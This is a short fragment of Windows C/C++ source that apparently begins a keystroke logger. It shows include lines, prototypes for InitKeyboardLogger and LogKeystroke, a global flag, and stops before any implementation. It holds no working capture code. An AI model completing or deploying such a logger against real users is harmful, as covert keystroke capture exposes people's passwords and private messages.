#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <ctime>

// Function prototypes
void InitKeyboardLogger();
void LogKeystroke(char key, char* timestamp);

// Global flag to check if initialization is done
volatile bool isLoggerInitialized = false;

// Logger file handle
